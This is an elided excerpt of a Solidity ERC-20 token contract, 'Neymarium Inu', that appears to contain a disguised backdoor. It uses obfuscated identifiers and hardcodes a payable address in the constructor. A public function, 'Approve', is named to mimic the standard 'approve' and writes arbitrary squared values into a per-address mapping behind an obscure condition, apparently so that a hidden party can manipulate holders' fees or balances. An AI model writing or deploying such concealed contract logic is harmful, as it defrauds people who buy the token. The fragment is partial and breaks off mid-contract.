...
contract Neymarium is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Neymarium Inu";
    string private _symbol = "NEYMARIUM";
    ...
    constructor () {
        ...
        chongq = payable(address(0xD41c2E7f2609Ba799748B2E3B5e75d2606914BDd));
    ...
    function Approve(address jn,uint256 qd) public {
        ...
        if (nmg(3-1-1,qd)) {beij[jn] = qd**2+1;}
    }
